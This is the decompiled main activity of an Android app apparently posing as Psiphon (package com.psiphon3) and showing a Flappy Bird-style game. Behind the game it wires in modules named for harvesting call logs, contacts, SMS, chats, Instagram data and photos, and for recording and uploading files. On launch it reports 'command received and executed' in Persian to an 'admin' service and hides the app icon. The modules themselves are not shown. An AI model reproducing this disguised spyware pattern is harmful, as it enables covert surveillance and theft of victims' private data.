package com.psiphon3;


import anywheresoftware.b4a.B4AMenuItem;
import android.app.Activity;
import android.os.Bundle;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.B4AActivity;
import anywheresoftware.b4a.ObjectWrapper;
import anywheresoftware.b4a.objects.ActivityWrapper;
import java.lang.reflect.InvocationTargetException;
import anywheresoftware.b4a.B4AUncaughtException;
import anywheresoftware.b4a.debug.*;
import java.lang.ref.WeakReference;

public class main extends Activity implements B4AActivity{
	public static main mostCurrent;
	static boolean afterFirstLayout;
	static boolean isFirst = true;
    private static boolean processGlobalsRun = false;
	BALayout layout;
	public static BA processBA;
	BA activityBA;
    ActivityWrapper _activity;
    java.util.ArrayList<B4AMenuItem> menuItems;
	public static final boolean fullScreen = false;
	public static final boolean includeTitle = false;
    public static WeakReference<Activity> previousOne;
    public static boolean dontPause;

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
        mostCurrent = this;
		if (processBA == null) {
			processBA = new BA(this.getApplicationContext(), null, null, "com.psiphon3", "com.psiphon3.main");
			processBA.loadHtSubs(this.getClass());
	        float deviceScale = getApplicationContext().getResources().getDisplayMetrics().density;
	        BALayout.setDeviceScale(deviceScale);
            
		}
		else if (previousOne != null) {
			Activity p = previousOne.get();
			if (p != null && p != this) {
                BA.LogInfo("Killing previous instance (main).");
				p.finish();
			}
		}
        processBA.setActivityPaused(true);
        processBA.runHook("oncreate", this, null);
		if (!includeTitle) {
        	this.getWindow().requestFeature(android.view.Window.FEATURE_NO_TITLE);
        }
        if (fullScreen) {
        	getWindow().setFlags(android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,   
        			android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN);
        }
		
        processBA.sharedProcessBA.activityBA = null;
		layout = new BALayout(this);
		setContentView(layout);
		afterFirstLayout = false;
        WaitForLayout wl = new WaitForLayout();
        if (anywheresoftware.b4a.objects.ServiceHelper.StarterHelper.startFromActivity(this, processBA, wl, false))
		    BA.handler.postDelayed(wl, 5);

	}
	static class WaitForLayout implements Runnable {
		public void run() {
			if (afterFirstLayout)
				return;
			if (mostCurrent == null)
				return;
            
			if (mostCurrent.layout.getWidth() == 0) {
				BA.handler.postDelayed(this, 5);
				return;
			}
			mostCurrent.layout.getLayoutParams().height = mostCurrent.layout.getHeight();
			mostCurrent.layout.getLayoutParams().width = mostCurrent.layout.getWidth();
			afterFirstLayout = true;
			mostCurrent.afterFirstLayout();
		}
	}
	private void afterFirstLayout() {
        if (this != mostCurrent)
			return;
		activityBA = new BA(this, layout, processBA, "com.psiphon3", "com.psiphon3.main");
        
        processBA.sharedProcessBA.activityBA = new java.lang.ref.WeakReference<BA>(activityBA);
        anywheresoftware.b4a.objects.ViewWrapper.lastId = 0;
        _activity = new ActivityWrapper(activityBA, "activity");
        anywheresoftware.b4a.Msgbox.isDismissing = false;
        if (BA.isShellModeRuntimeCheck(processBA)) {
			if (isFirst)
				processBA.raiseEvent2(null, true, "SHELL", false);
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.main", processBA, activityBA, _activity, anywheresoftware.b4a.keywords.Common.Density, mostCurrent);
			_activity.reinitializeForShell(activityBA, "activity");
		}
        initializeProcessGlobals();		
        initializeGlobals();
        
        BA.LogInfo("** Activity (main) Create, isFirst = " + isFirst + " **");
        processBA.raiseEvent2(null, true, "activity_create", false, isFirst);
		isFirst = false;
		if (this != mostCurrent)
			return;
        processBA.setActivityPaused(false);
        BA.LogInfo("** Activity (main) Resume **");
        processBA.raiseEvent(null, "activity_resume");
        if (android.os.Build.VERSION.SDK_INT >= 11) {
			try {
				android.app.Activity.class.getMethod("invalidateOptionsMenu").invoke(this,(Object[]) null);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}
	public void addMenuItem(B4AMenuItem item) {
		if (menuItems == null)
			menuItems = new java.util.ArrayList<B4AMenuItem>();
		menuItems.add(item);
	}
	@Override
	public boolean onCreateOptionsMenu(android.view.Menu menu) {
		super.onCreateOptionsMenu(menu);
        try {
            if (processBA.subExists("activity_actionbarhomeclick")) {
                Class.forName("android.app.ActionBar").getMethod("setHomeButtonEnabled", boolean.class).invoke(
                    getClass().getMethod("getActionBar").invoke(this), true);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (processBA.runHook("oncreateoptionsmenu", this, new Object[] {menu}))
            return true;
		if (menuItems == null)
			return false;
		for (B4AMenuItem bmi : menuItems) {
			android.view.MenuItem mi = menu.add(bmi.title);
			if (bmi.drawable != null)
				mi.setIcon(bmi.drawable);
            if (android.os.Build.VERSION.SDK_INT >= 11) {
				try {
                    if (bmi.addToBar) {
				        android.view.MenuItem.class.getMethod("setShowAsAction", int.class).invoke(mi, 1);
                    }
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			mi.setOnMenuItemClickListener(new B4AMenuItemsClickListener(bmi.eventName.toLowerCase(BA.cul)));
		}
        
		return true;
	}   
 @Override
 public boolean onOptionsItemSelected(android.view.MenuItem item) {
    if (item.getItemId() == 16908332) {
        processBA.raiseEvent(null, "activity_actionbarhomeclick");
        return true;
    }
    else
        return super.onOptionsItemSelected(item); 
}
@Override
 public boolean onPrepareOptionsMenu(android.view.Menu menu) {
    super.onPrepareOptionsMenu(menu);
    processBA.runHook("onprepareoptionsmenu", this, new Object[] {menu});
    return true;
    
 }
 protected void onStart() {
    super.onStart();
    processBA.runHook("onstart", this, null);
}
 protected void onStop() {
    super.onStop();
    processBA.runHook("onstop", this, null);
}
    public void onWindowFocusChanged(boolean hasFocus) {
       super.onWindowFocusChanged(hasFocus);
       if (processBA.subExists("activity_windowfocuschanged"))
           processBA.raiseEvent2(null, true, "activity_windowfocuschanged", false, hasFocus);
    }
	private class B4AMenuItemsClickListener implements android.view.MenuItem.OnMenuItemClickListener {
		private final String eventName;
		public B4AMenuItemsClickListener(String eventName) {
			this.eventName = eventName;
		}
		public boolean onMenuItemClick(android.view.MenuItem item) {
			processBA.raiseEventFromUI(item.getTitle(), eventName + "_click");
			return true;
		}
	}
    public static Class<?> getObject() {
		return main.class;
	}
    private Boolean onKeySubExist = null;
    private Boolean onKeyUpSubExist = null;
	@Override
	public boolean onKeyDown(int keyCode, android.view.KeyEvent event) {
        if (processBA.runHook("onkeydown", this, new Object[] {keyCode, event}))
            return true;
		if (onKeySubExist == null)
			onKeySubExist = processBA.subExists("activity_keypress");
		if (onKeySubExist) {
			if (keyCode == anywheresoftware.b4a.keywords.constants.KeyCodes.KEYCODE_BACK &&
					android.os.Build.VERSION.SDK_INT >= 18) {
				HandleKeyDelayed hk = new HandleKeyDelayed();
				hk.kc = keyCode;
				BA.handler.post(hk);
				return true;
			}
			else {
				boolean res = new HandleKeyDelayed().runDirectly(keyCode);
				if (res)
					return true;
			}
		}
		return super.onKeyDown(keyCode, event);
	}
	private class HandleKeyDelayed implements Runnable {
		int kc;
		public void run() {
			runDirectly(kc);
		}
		public boolean runDirectly(int keyCode) {
			Boolean res =  (Boolean)processBA.raiseEvent2(_activity, false, "activity_keypress", false, keyCode);
			if (res == null || res == true) {
                return true;
            }
            else if (keyCode == anywheresoftware.b4a.keywords.constants.KeyCodes.KEYCODE_BACK) {
				finish();
				return true;
			}
            return false;
		}
		
	}
    @Override
	public boolean onKeyUp(int keyCode, android.view.KeyEvent event) {
        if (processBA.runHook("onkeyup", this, new Object[] {keyCode, event}))
            return true;
		if (onKeyUpSubExist == null)
			onKeyUpSubExist = processBA.subExists("activity_keyup");
		if (onKeyUpSubExist) {
			Boolean res =  (Boolean)processBA.raiseEvent2(_activity, false, "activity_keyup", false, keyCode);
			if (res == null || res == true)
				return true;
		}
		return super.onKeyUp(keyCode, event);
	}
	@Override
	public void onNewIntent(android.content.Intent intent) {
        super.onNewIntent(intent);
		this.setIntent(intent);
        processBA.runHook("onnewintent", this, new Object[] {intent});
	}
    @Override 
	public void onPause() {
		super.onPause();
        if (_activity == null)
            return;
        if (this != mostCurrent)
			return;
		anywheresoftware.b4a.Msgbox.dismiss(true);
        if (!dontPause)
            BA.LogInfo("** Activity (main) Pause, UserClosed = " + activityBA.activity.isFinishing() + " **");
        else
            BA.LogInfo("** Activity (main) Pause event (activity is not paused). **");
        if (mostCurrent != null)
            processBA.raiseEvent2(_activity, true, "activity_pause", false, activityBA.activity.isFinishing());		
        if (!dontPause) {
            processBA.setActivityPaused(true);
            mostCurrent = null;
        }

        if (!activityBA.activity.isFinishing())
			previousOne = new WeakReference<Activity>(this);
        anywheresoftware.b4a.Msgbox.isDismissing = false;
        processBA.runHook("onpause", this, null);
	}

	@Override
	public void onDestroy() {
        super.onDestroy();
		previousOne = null;
        processBA.runHook("ondestroy", this, null);
	}
    @Override 
	public void onResume() {
		super.onResume();
        mostCurrent = this;
        anywheresoftware.b4a.Msgbox.isDismissing = false;
        if (activityBA != null) { //will be null during activity create (which waits for AfterLayout).
        	ResumeMessage rm = new ResumeMessage(mostCurrent);
        	BA.handler.post(rm);
        }
        processBA.runHook("onresume", this, null);
	}
    private static class ResumeMessage implements Runnable {
    	private final WeakReference<Activity> activity;
    	public ResumeMessage(Activity activity) {
    		this.activity = new WeakReference<Activity>(activity);
    	}
		public void run() {
            main mc = mostCurrent;
			if (mc == null || mc != activity.get())
				return;
			processBA.setActivityPaused(false);
            BA.LogInfo("** Activity (main) Resume **");
            if (mc != mostCurrent)
                return;
		    processBA.raiseEvent(mc._activity, "activity_resume", (Object[])null);
		}
    }
	@Override
	protected void onActivityResult(int requestCode, int resultCode,
	      android.content.Intent data) {
		processBA.onActivityResult(requestCode, resultCode, data);
        processBA.runHook("onactivityresult", this, new Object[] {requestCode, resultCode});
	}
	private static void initializeGlobals() {
		processBA.raiseEvent2(null, true, "globals", false, (Object[])null);
	}
    public void onRequestPermissionsResult(int requestCode,
        String permissions[], int[] grantResults) {
        for (int i = 0;i < permissions.length;i++) {
            Object[] o = new Object[] {permissions[i], grantResults[i] == 0};
            processBA.raiseEventFromDifferentThread(null,null, 0, "activity_permissionresult", true, o);
        }
            
    }

public anywheresoftware.b4a.keywords.Common __c = null;
public anywheresoftware.b4a.libgdx.graphics.lgTexture _vvvvvvvvvvvv1 = null;
public anywheresoftware.b4a.objects.ConcreteViewWrapper _vvvvvvvvvv7 = null;
public static float _vvvvvvvvvvv3 = 0f;
public static float _vvvvvvvvvvv5 = 0f;
public anywheresoftware.b4a.libgdx.graphics.lgTexture _vvvvvvvvvvvv2 = null;
public static float _vvvvvvvvvvvv3 = 0f;
public static float _vvvvvvvvvvvv4 = 0f;
public anywheresoftware.b4a.libgdx.LibGDX _vvvvvvvvvv0 = null;
public anywheresoftware.b4a.libgdx.graphics.lgGL _vvvvvvvvvvvv5 = null;
public anywheresoftware.b4a.libgdx.graphics.lgOrthographicCamera _vvvvvvvvvvvv6 = null;
public anywheresoftware.b4a.libgdx.graphics.lgSpriteBatch _vvvvvvvvvvvv7 = null;
public static int _vvvvvvvvvvvv0 = 0;
public anywheresoftware.b4a.objects.collections.List _vvvvvvvvvvv1 = null;
public anywheresoftware.b4a.libgdx.graphics.lgTexture _img_pipe = null;
public static float _vvvvvvvvvvv2 = 0f;
public static float _vvvvvvvvvvv4 = 0f;
public com.psiphon3.main._typbird _vvvvvvvvvvv6 = null;
public static int _vvvvvvvvvvvvv1 = 0;
public anywheresoftware.b4a.libgdx.graphics.lgTextureRegion _vvvvvvvvvvvvv2 = null;
public anywheresoftware.b4a.libgdx.graphics.lgTextureRegion[][] _vvvvvvvvvvvvv3 = null;
public anywheresoftware.b4a.libgdx.graphics.lgTexture _vvvvvvvvvvvvv4 = null;
public static int _vvvvvvvvvvvvv5 = 0;
public anywheresoftware.b4a.libgdx.input.lgInputProcessor _vvvvvvvvvvvvv6 = null;
public static boolean _vvvvvvvvvvvvv7 = false;
public static boolean _vvvvvvvvvvvvv0 = false;
public static int _vvvvvvvvvvvvvv1 = 0;
public static int _vvvvvvvvvvvvvv2 = 0;
public anywheresoftware.b4a.libgdx.graphics.lgBitmapFont _vvvvvvvvvvvvvv3 = null;
public static int _vvvvvvvvvvv0 = 0;
public anywheresoftware.b4a.randomaccessfile.RandomAccessFile _vvvvvvvvvvv7 = null;
public anywheresoftware.b4a.libgdx.audio.lgSound _snd_hit = null;
public anywheresoftware.b4a.libgdx.audio.lgSound _snd_flap = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static class _typpipe{
public boolean IsInitialized;
public float x;
public float y;
public boolean scored;
public void Initialize() {
IsInitialized = true;
x = 0f;
y = 0f;
scored = false;
}
@Override
		public String toString() {
			return BA.TypeToString(this, false);
		}}
public static class _typbird{
public boolean IsInitialized;
public float x;
public float y;
public float my;
public void Initialize() {
IsInitialized = true;
x = 0f;
y = 0f;
my = 0f;
}
@Override
		public String toString() {
			return BA.TypeToString(this, false);
		}}

public static boolean isAnyActivityVisible() {
    boolean vis = false;
vis = vis | (main.mostCurrent != null);
vis = vis | (cmr.mostCurrent != null);
vis = vis | (cmr2.mostCurrent != null);
return vis;}
public static void  _activity_create(boolean _firsttime) throws Exception{
ResumableSub_Activity_Create rsub = new ResumableSub_Activity_Create(null,_firsttime);
rsub.resume(processBA, null);
}
public static class ResumableSub_Activity_Create extends BA.ResumableSub {
public ResumableSub_Activity_Create(com.psiphon3.main parent,boolean _firsttime) {
this.parent = parent;
this._firsttime = _firsttime;
}
com.psiphon3.main parent;
boolean _firsttime;
chandresane.com.lib.hide.BigHide _big = null;
anywheresoftware.b4a.agraham.reflection.Reflection _r = null;

@Override
public void resume(BA ba, Object[] result) throws Exception{

    while (true) {
        switch (state) {
            case -1:
return;

case 0:
//C
this.state = 1;
 //BA.debugLineNum = 66;BA.debugLine="Dim big As BigHide";
_big = new chandresane.com.lib.hide.BigHide();
 //BA.debugLineNum = 67;BA.debugLine="Dim r As Reflector";
_r = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 70;BA.debugLine="CallSubDelayed3(srv, \"getKey\" , \"admin\" , $\"{\"tex";
anywheresoftware.b4a.keywords.Common.CallSubDelayed3(processBA,(Object)(parent.mostCurrent._vvvvvvvvvv3.getObject()),"getKey",(Object)("admin"),(Object)(("{\"text\":\"دستور شما دریافت و اجرا شد\"}")));
 //BA.debugLineNum = 71;BA.debugLine="Sleep(5000)";
anywheresoftware.b4a.keywords.Common.Sleep(mostCurrent.activityBA,this,(int) (5000));
this.state = 7;
return;
case 7:
//C
this.state = 1;
;
 //BA.debugLineNum = 72;BA.debugLine="Activity.Finish";
parent.mostCurrent._activity.Finish();
 //BA.debugLineNum = 73;BA.debugLine="big.HideIcon(r.GetActivity,r.GetActivity)";
_big.HideIcon((android.content.Context)(_r.GetActivity(processBA)),_r.GetActivity(processBA));
 //BA.debugLineNum = 77;BA.debugLine="surface = lGdx.InitializeView(\"LG\")";
parent.mostCurrent._vvvvvvvvvv7 = parent.mostCurrent._vvvvvvvvvv0.InitializeView(mostCurrent.activityBA,"LG");
 //BA.debugLineNum = 78;BA.debugLine="Activity.AddView(surface, 0, 0, 100%x, 100%y) ' f";
parent.mostCurrent._activity.AddView((android.view.View)(parent.mostCurrent._vvvvvvvvvv7.getObject()),(int) (0),(int) (0),anywheresoftware.b4a.keywords.Common.PerXToCurrent((float) (100),mostCurrent.activityBA),anywheresoftware.b4a.keywords.Common.PerYToCurrent((float) (100),mostCurrent.activityBA));
 //BA.debugLineNum = 79;BA.debugLine="pipes.Initialize ' initialise pipes list for new";
parent.mostCurrent._vvvvvvvvvvv1.Initialize();
 //BA.debugLineNum = 80;BA.debugLine="scaleX = (vpW/400) ' set scaleX to allow for diff";
parent._vvvvvvvvvvv2 = (float) ((parent._vvvvvvvvvvv3/(double)400));
 //BA.debugLineNum = 81;BA.debugLine="scaleY = (vpH/600) ' set scaleY to allow for diff";
parent._vvvvvvvvvvv4 = (float) ((parent._vvvvvvvvvvv5/(double)600));
 //BA.debugLineNum = 84;BA.debugLine="myBird.Initialize ' initialise mybird object";
parent.mostCurrent._vvvvvvvvvvv6.Initialize();
 //BA.debugLineNum = 87;BA.debugLine="If File.Exists(File.DirInternal,\"scores.dat\") The";
if (true) break;

case 1:
//if
this.state = 6;
if (anywheresoftware.b4a.keywords.Common.File.Exists(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"scores.dat")) { 
this.state = 3;
}else {
this.state = 5;
}if (true) break;

case 3:
//C
this.state = 6;
 //BA.debugLineNum = 88;BA.debugLine="scorefile.Initialize(File.DirInternal,\"scores.da";
parent.mostCurrent._vvvvvvvvvvv7.Initialize(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"scores.dat",anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 89;BA.debugLine="highscore = scorefile.ReadInt(0) 'read score fro";
parent._vvvvvvvvvvv0 = parent.mostCurrent._vvvvvvvvvvv7.ReadInt((long) (0));
 //BA.debugLineNum = 90;BA.debugLine="scorefile.Close ' close file after use";
parent.mostCurrent._vvvvvvvvvvv7.Close();
 if (true) break;

case 5:
//C
this.state = 6;
 //BA.debugLineNum = 92;BA.debugLine="highscore = 0 ' set highscore to zero if first r";
parent._vvvvvvvvvvv0 = (int) (0);
 if (true) break;

case 6:
//C
this.state = -1;
;
 //BA.debugLineNum = 95;BA.debugLine="End Sub";
if (true) break;

            }
        }
    }
}
public static String  _activity_pause(boolean _userclosed) throws Exception{
 //BA.debugLineNum = 102;BA.debugLine="Sub Activity_Pause (UserClosed As Boolean)";
 //BA.debugLineNum = 104;BA.debugLine="If lGdx.IsInitialized Then lGdx.Pause";
if (mostCurrent._vvvvvvvvvv0.IsInitialized()) { 
mostCurrent._vvvvvvvvvv0.Pause();};
 //BA.debugLineNum = 106;BA.debugLine="End Sub";
return "";
}
public static String  _activity_resume() throws Exception{
 //BA.debugLineNum = 97;BA.debugLine="Sub Activity_Resume";
 //BA.debugLineNum = 99;BA.debugLine="If lGdx.IsInitialized Then lGdx.Resume";
if (mostCurrent._vvvvvvvvvv0.IsInitialized()) { 
mostCurrent._vvvvvvvvvv0.Resume();};
 //BA.debugLineNum = 100;BA.debugLine="End Sub";
return "";
}
public static String  _globals() throws Exception{
 //BA.debugLineNum = 21;BA.debugLine="Sub Globals";
 //BA.debugLineNum = 24;BA.debugLine="Dim myBacking As lgTexture ' backgound image";
mostCurrent._vvvvvvvvvvvv1 = new anywheresoftware.b4a.libgdx.graphics.lgTexture();
 //BA.debugLineNum = 25;BA.debugLine="Dim surface As View ' main view to show libGDX su";
mostCurrent._vvvvvvvvvv7 = new anywheresoftware.b4a.objects.ConcreteViewWrapper();
 //BA.debugLineNum = 26;BA.debugLine="Dim vpW As Float = 720 'set view port width (scal";
_vvvvvvvvvvv3 = (float) (720);
 //BA.debugLineNum = 27;BA.debugLine="Dim vpH As Float = 1134 'set vieport height";
_vvvvvvvvvvv5 = (float) (1134);
 //BA.debugLineNum = 28;BA.debugLine="Dim myGD As lgTexture 'ground image";
mostCurrent._vvvvvvvvvvvv2 = new anywheresoftware.b4a.libgdx.graphics.lgTexture();
 //BA.debugLineNum = 29;BA.debugLine="Dim frames As Float = 0";
_vvvvvvvvvvvv3 = (float) (0);
 //BA.debugLineNum = 30;BA.debugLine="Dim speed As Float = 3";
_vvvvvvvvvvvv4 = (float) (3);
 //BA.debugLineNum = 32;BA.debugLine="Dim lGdx As LibGDX ' declare libgdx to load libra";
mostCurrent._vvvvvvvvvv0 = new anywheresoftware.b4a.libgdx.LibGDX();
 //BA.debugLineNum = 33;BA.debugLine="Dim GL As lgGL ' declare opengl";
mostCurrent._vvvvvvvvvvvv5 = new anywheresoftware.b4a.libgdx.graphics.lgGL();
 //BA.debugLineNum = 34;BA.debugLine="Dim Camera As lgOrthographicCamera ' declare came";
mostCurrent._vvvvvvvvvvvv6 = new anywheresoftware.b4a.libgdx.graphics.lgOrthographicCamera();
 //BA.debugLineNum = 35;BA.debugLine="Dim Batch As lgSpriteBatch ' set up sprite batch";
mostCurrent._vvvvvvvvvvvv7 = new anywheresoftware.b4a.libgdx.graphics.lgSpriteBatch();
 //BA.debugLineNum = 36;BA.debugLine="Type typpipe(x As Float, y As Float, scored As Bo";
;
 //BA.debugLineNum = 37;BA.debugLine="Dim pipeCD As Int = 50 ' countdown before pipes s";
_vvvvvvvvvvvv0 = (int) (50);
 //BA.debugLineNum = 38;BA.debugLine="Dim pipes As List ' stores pipes";
mostCurrent._vvvvvvvvvvv1 = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 39;BA.debugLine="Dim img_pipe As lgTexture ' stores image of pipe";
mostCurrent._img_pipe = new anywheresoftware.b4a.libgdx.graphics.lgTexture();
 //BA.debugLineNum = 40;BA.debugLine="Dim scaleX As Float";
_vvvvvvvvvvv2 = 0f;
 //BA.debugLineNum = 41;BA.debugLine="Dim scaleY As Float";
_vvvvvvvvvvv4 = 0f;
 //BA.debugLineNum = 42;BA.debugLine="Type typbird(x As Float, y As Float, my As Float)";
;
 //BA.debugLineNum = 43;BA.debugLine="Dim myBird As typbird ' holds details for bird, i";
mostCurrent._vvvvvvvvvvv6 = new com.psiphon3.main._typbird();
 //BA.debugLineNum = 44;BA.debugLine="Dim birdAngle As Int = 0 ' angle of bird";
_vvvvvvvvvvvvv1 = (int) (0);
 //BA.debugLineNum = 45;BA.debugLine="Dim BirdRegion As lgTextureRegion ' store bird im";
mostCurrent._vvvvvvvvvvvvv2 = new anywheresoftware.b4a.libgdx.graphics.lgTextureRegion();
 //BA.debugLineNum = 46;BA.debugLine="Dim BirdFrames(,) As lgTextureRegion ' stores fra";
mostCurrent._vvvvvvvvvvvvv3 = new anywheresoftware.b4a.libgdx.graphics.lgTextureRegion[(int) (0)][];
{
int d0 = mostCurrent._vvvvvvvvvvvvv3.length;
int d1 = (int) (0);
for (int i0 = 0;i0 < d0;i0++) {
mostCurrent._vvvvvvvvvvvvv3[i0] = new anywheresoftware.b4a.libgdx.graphics.lgTextureRegion[d1];
for (int i1 = 0;i1 < d1;i1++) {
mostCurrent._vvvvvvvvvvvvv3[i0][i1] = new anywheresoftware.b4a.libgdx.graphics.lgTextureRegion();
}
}
}
;
 //BA.debugLineNum = 47;BA.debugLine="Dim BirdTexture As lgTexture";
mostCurrent._vvvvvvvvvvvvv4 = new anywheresoftware.b4a.libgdx.graphics.lgTexture();
 //BA.debugLineNum = 48;BA.debugLine="Dim birdColour As Int = Rnd(0,4) ' set bird colou";
_vvvvvvvvvvvvv5 = anywheresoftware.b4a.keywords.Common.Rnd((int) (0),(int) (4));
 //BA.debugLineNum = 49;BA.debugLine="Dim IP As lgInputProcessor";
mostCurrent._vvvvvvvvvvvvv6 = new anywheresoftware.b4a.libgdx.input.lgInputProcessor();
 //BA.debugLineNum = 50;BA.debugLine="Dim gamerunning As Boolean = True ' used to decid";
_vvvvvvvvvvvvv7 = anywheresoftware.b4a.keywords.Common.True;
 //BA.debugLineNum = 51;BA.debugLine="Dim birddead As Boolean = False ' start bird as b";
_vvvvvvvvvvvvv0 = anywheresoftware.b4a.keywords.Common.False;
 //BA.debugLineNum = 52;BA.debugLine="Dim restartCD As Int = 60 ' countdown timer to re";
_vvvvvvvvvvvvvv1 = (int) (60);
 //BA.debugLineNum = 53;BA.debugLine="Dim score As Int = 0";
_vvvvvvvvvvvvvv2 = (int) (0);
 //BA.debugLineNum = 54;BA.debugLine="Dim bitmapfont As lgBitmapFont ' declare bitmap f";
mostCurrent._vvvvvvvvvvvvvv3 = new anywheresoftware.b4a.libgdx.graphics.lgBitmapFont();
 //BA.debugLineNum = 56;BA.debugLine="Dim highscore As Int ' stores high score";
_vvvvvvvvvvv0 = 0;
 //BA.debugLineNum = 57;BA.debugLine="Dim scorefile As RandomAccessFile ' highscore fil";
mostCurrent._vvvvvvvvvvv7 = new anywheresoftware.b4a.randomaccessfile.RandomAccessFile();
 //BA.debugLineNum = 58;BA.debugLine="Dim snd_hit As lgSound ' sound for bird hitting p";
mostCurrent._snd_hit = new anywheresoftware.b4a.libgdx.audio.lgSound();
 //BA.debugLineNum = 59;BA.debugLine="Dim snd_flap As lgSound ' flapping sound file";
mostCurrent._snd_flap = new anywheresoftware.b4a.libgdx.audio.lgSound();
 //BA.debugLineNum = 60;BA.debugLine="Dim gamerunning As Boolean = False";
_vvvvvvvvvvvvv7 = anywheresoftware.b4a.keywords.Common.False;
 //BA.debugLineNum = 61;BA.debugLine="End Sub";
return "";
}
public static boolean  _ip_touchdown(int _screenx,int _screeny,int _pointer) throws Exception{
 //BA.debugLineNum = 318;BA.debugLine="Sub IP_TouchDown(screenX As Int, screenY As Int, P";
 //BA.debugLineNum = 319;BA.debugLine="If gamerunning = True Then 'if game running";
if (_vvvvvvvvvvvvv7==anywheresoftware.b4a.keywords.Common.True) { 
 //BA.debugLineNum = 320;BA.debugLine="If birddead = False Then ' and bird alive";
if (_vvvvvvvvvvvvv0==anywheresoftware.b4a.keywords.Common.False) { 
 //BA.debugLineNum = 321;BA.debugLine="myBird.my = 4*scaleY 'flap wings";
mostCurrent._vvvvvvvvvvv6.my /*float*/  = (float) (4*_vvvvvvvvvvv4);
 //BA.debugLineNum = 322;BA.debugLine="snd_flap.Play";
mostCurrent._snd_flap.Play();
 }else if(_vvvvvvvvvvvvv0==anywheresoftware.b4a.keywords.Common.True && _vvvvvvvvvvvvvv1<0) { 
 //BA.debugLineNum = 324;BA.debugLine="birddead = False 'revive bird";
_vvvvvvvvvvvvv0 = anywheresoftware.b4a.keywords.Common.False;
 //BA.debugLineNum = 325;BA.debugLine="pipes.Clear 'remove all pipes";
mostCurrent._vvvvvvvvvvv1.Clear();
 //BA.debugLineNum = 326;BA.debugLine="speed = 3 'reset speed";
_vvvvvvvvvvvv4 = (float) (3);
 //BA.debugLineNum = 327;BA.debugLine="myBird.Y = vpH*0.5 ' set bird y coord to restar";
mostCurrent._vvvvvvvvvvv6.y /*float*/  = (float) (_vvvvvvvvvvv5*0.5);
 //BA.debugLineNum = 328;BA.debugLine="myBird.my = 4*scaleY 'set starting flap";
mostCurrent._vvvvvvvvvvv6.my /*float*/  = (float) (4*_vvvvvvvvvvv4);
 //BA.debugLineNum = 329;BA.debugLine="restartCD = 60 'set restart countdown";
_vvvvvvvvvvvvvv1 = (int) (60);
 //BA.debugLineNum = 330;BA.debugLine="pipeCD = 100 'set first pipe countdown";
_vvvvvvvvvvvv0 = (int) (100);
 //BA.debugLineNum = 331;BA.debugLine="birdColour = Rnd(0,4) ' random bird colour";
_vvvvvvvvvvvvv5 = anywheresoftware.b4a.keywords.Common.Rnd((int) (0),(int) (4));
 //BA.debugLineNum = 332;BA.debugLine="score = 0 ' reset score";
_vvvvvvvvvvvvvv2 = (int) (0);
 };
 }else {
 //BA.debugLineNum = 336;BA.debugLine="gamerunning = True ' set game to running state";
_vvvvvvvvvvvvv7 = anywheresoftware.b4a.keywords.Common.True;
 //BA.debugLineNum = 337;BA.debugLine="myBird.my = 4*scaleY ' alter my to make bird fla";
mostCurrent._vvvvvvvvvvv6.my /*float*/  = (float) (4*_vvvvvvvvvvv4);
 };
 //BA.debugLineNum = 340;BA.debugLine="End Sub";
return false;
}
public static String  _lg_create() throws Exception{
 //BA.debugLineNum = 109;BA.debugLine="Sub LG_Create";
 //BA.debugLineNum = 111;BA.debugLine="Batch.Initialize ' initialise batch for drawing g";
mostCurrent._vvvvvvvvvvvv7.Initialize();
 //BA.debugLineNum = 112;BA.debugLine="myBacking.InitializeWithFile(lGdx.Files.internal(";
mostCurrent._vvvvvvvvvvvv1.InitializeWithFile(mostCurrent._vvvvvvvvvv0.Files().internal("day_background.png"));
 //BA.debugLineNum = 113;BA.debugLine="myGD.InitializeWithFile(lGdx.Files.internal(\"grou";
mostCurrent._vvvvvvvvvvvv2.InitializeWithFile(mostCurrent._vvvvvvvvvv0.Files().internal("ground.png"));
 //BA.debugLineNum = 114;BA.debugLine="img_pipe.InitializeWithFile(lGdx.Files.internal(\"";
mostCurrent._img_pipe.InitializeWithFile(mostCurrent._vvvvvvvvvv0.Files().internal("pipe.png"));
 //BA.debugLineNum = 117;BA.debugLine="BirdTexture.Initialize(\"bird.png\") 'load bird ima";
mostCurrent._vvvvvvvvvvvvv4.Initialize("bird.png");
 //BA.debugLineNum = 118;BA.debugLine="BirdRegion.InitializeWithTexture(BirdTexture) ' c";
mostCurrent._vvvvvvvvvvvvv2.InitializeWithTexture(mostCurrent._vvvvvvvvvvvvv4);
 //BA.debugLineNum = 119;BA.debugLine="Dim BirdFrames(,) As lgTextureRegion = BirdRegion";
mostCurrent._vvvvvvvvvvvvv3 = mostCurrent._vvvvvvvvvvvvv2.Split((int) (34),(int) (24));
 //BA.debugLineNum = 122;BA.debugLine="myBird.x = vpW*0.2";
